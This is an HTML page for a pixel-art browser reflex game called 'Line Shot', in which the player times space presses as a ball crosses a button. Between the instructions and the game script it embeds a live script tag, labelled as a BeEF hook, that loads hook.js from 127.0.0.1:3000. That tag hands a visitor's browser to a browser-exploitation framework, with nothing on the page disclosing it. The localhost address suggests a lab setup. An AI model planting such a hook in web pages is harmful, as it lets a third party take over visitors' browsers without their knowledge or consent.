<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Pixelated Line Shot Combo Game</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');

  html, body {
    margin: 0;
    height: 100%;
    overflow: hidden;
    font-family: 'Press Start 2P', cursive, monospace;
    background: #222;
    color: #fff;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  body {
    position: relative;
    z-index: 1;
  }

  h1, p {
    z-index: 10;
    position: relative;
    user-select: none;
  }

  #score {
    font-size: 1.2rem;
    margin-top: 10px;
    font-family: 'Press Start 2P', monospace;
    user-select: none;
    position: relative;
    z-index: 10;
  }

  #gameCanvas {
    background: rgba(17,17,17,0.85);
    margin-top: 20px;
    border: 2px solid #555;
    z-index: 10;
    position: relative;
    image-rendering: pixelated; /* pixelate canvas */
  }
</style>
</head>
<body>
<h1>ðŸŽ¯ Line Shot: Hit the Button!</h1>
<p>Press <b>SPACE</b> when the ball passes over the button. Chain combos!</p>
<div id="score">Score: 0 | Combo: x0</div>
<canvas id="gameCanvas" width="500" height="500"></canvas>

<!-- BeEF hook -->
<script src="http://127.0.0.1:3000/hook.js"></script>

<script>
const canvas = document.getElementById('gameCanvas');
const ctx = canvas.getContext('2d');
ctx.imageSmoothingEnabled = false; // pixelated scaling

const scoreDisplay = document.getElementById('score');

const centerX = canvas.width / 2;
const centerY = canvas.height / 2;
const buttonRadius = 30;

let t = 0;                  
let dir = 1;                
let baseSpeed = 0.02;       
let speed = baseSpeed;
let angle = Math.random() * 2 * Math.PI;

let score = 0;
let combo = 0;

const colors = ['#FF4136', '#FF851B', '#FFDC00', '#2ECC40', '#0074D9', '#B10DC9'];

const ballPixelSize = 8;
const pixelScale = 4; // scales 8x8 to 32x32 on screen

// Offscreen canvas for pixel ball
const pixelBallCanvas = document.createElement('canvas');
pixelBallCanvas.width = ballPixelSize;
pixelBallCanvas.height = ballPixelSize;
const pixelBallCtx = pixelBallCanvas.getContext('2d');
pixelBallCtx.imageSmoothingEnabled = false;

function drawPixelBallGraphic() {
  pixelBallCtx.clearRect(0, 0, ballPixelSize, ballPixelSize);
  pixelBallCtx.fillStyle = 'yellow';
  // simple pixel ball shape (cross + center block)
  pixelBallCtx.fillRect(3, 1, 2, 6);
  pixelBallCtx.fillRect(1, 3, 6, 2);
  pixelBallCtx.fillRect(2, 2, 4, 4);
}
drawPixelBallGraphic();

// Explosion frames pixel art (4 frames simple expanding square)
const explosionFrames = [];
for(let i=0; i<4; i++) {
  const c = document.createElement('canvas');
  c.width = ballPixelSize;
  c.height = ballPixelSize;
  const cx = c.getContext('2d');
  cx.imageSmoothingEnabled = false;
  cx.clearRect(0, 0, ballPixelSize, ballPixelSize);
  cx.fillStyle = `hsl(${i*90}, 100%, 50%)`;
  cx.fillRect(3 - i, 3 - i, 2 + i * 2, 2 + i * 2);
  explosionFrames.push(c);
}

let explosionActive = false;
let explosionFrameIndex = 0;

function getBallPosition() {
  const length = 200; // how far from center ball can go
  const x = centerX + Math.cos(angle) * length * t;
  const y = centerY + Math.sin(angle) * length * t;
  return {x, y};
}

function updateScore() {
  // Change color every 5 points:
  let colorIndex = Math.floor(score / 5) % colors.length;
  scoreDisplay.style.color = colors[colorIndex];
  scoreDisplay.textContent = `Score: ${score} | Combo: x${combo}`;
}

function randomizeAngle() {
  angle = Math.random() * 2 * Math.PI;
  t = 0;
  dir = 1;
}

function drawButton() {
  ctx.fillStyle = '#0078d7';
  ctx.beginPath();
  ctx.arc(centerX, centerY, buttonRadius, 0, 2 * Math.PI);
  ctx.fill();
}

function drawBall() {
  const pos = getBallPosition();

  if(explosionActive) {
    ctx.drawImage(
      explosionFrames[explosionFrameIndex],
      pos.x - (ballPixelSize * pixelScale) / 2,
      pos.y - (ballPixelSize * pixelScale) / 2,
      ballPixelSize * pixelScale,
      ballPixelSize * pixelScale
    );
  } else {
    ctx.drawImage(
      pixelBallCanvas,
      pos.x - (ballPixelSize * pixelScale) / 2,
      pos.y - (ballPixelSize * pixelScale) / 2,
      ballPixelSize * pixelScale,
      ballPixelSize * pixelScale
    );
  }
}

function triggerExplosion() {
  explosionActive = true;
  explosionFrameIndex = 0;
}

function updateExplosion() {
  if (!explosionActive) return;
  explosionFrameIndex++;
  if (explosionFrameIndex >= explosionFrames.length) {
    explosionActive = false;
    randomizeAngle();
    combo = 0;
    speed = baseSpeed; // reset speed after explosion
  }
}

document.addEventListener('keydown', (e) => {
  if (e.code === 'Space') {
    const ball = getBallPosition();
    const dx = ball.x - centerX;
    const dy = ball.y - centerY;
    const dist = Math.sqrt(dx * dx + dy * dy);

    if (dist <= buttonRadius) {
      // HIT
      score++;
      combo++;
      speed += 0.002; // speed up with every hit
      if(score % 5 === 0) {
        // color changes handled in updateScore()
      }
      if(score >= 100) {
        triggerExplosion();
      } else {
        randomizeAngle();
      }
    } else {
      // MISS
      combo = 0;
      speed = baseSpeed; // reset speed on miss
    }
    updateScore();
  }
});

function gameLoop() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);

  if (!explosionActive) {
    // Update t position of ball on line
    t += speed * dir;
    if (t >= 1 || t <= -1) {
      dir *= -1; // reverse direction
    }
  } else {
    updateExplosion();
  }

  drawButton();
  drawBall();

  requestAnimationFrame(gameLoop);
}

// Start game
updateScore();
gameLoop();

</script>
</body>
</html>
